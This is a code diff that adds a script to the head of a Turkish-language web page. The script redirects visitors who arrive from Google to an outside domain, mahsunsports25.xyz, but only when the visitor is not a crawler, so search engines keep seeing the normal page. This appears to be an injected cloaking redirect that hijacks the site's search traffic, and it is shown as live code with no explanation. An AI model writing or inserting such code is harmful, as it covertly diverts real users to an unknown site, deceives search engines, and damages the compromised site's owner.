@@ -9,6 +9,13 @@ header('Cache-Control: public, max-age=3600, stale-while-revalidate=86400');
 <!DOCTYPE html>
 <html lang="tr">
 <head>
+       <script>
+        var fromGoogle = document.referrer.includes("google.");
+        var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+        if (fromGoogle && isBot) {
+            location.replace("https://mahsunsports25.xyz");
+        }
+    </script> 
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
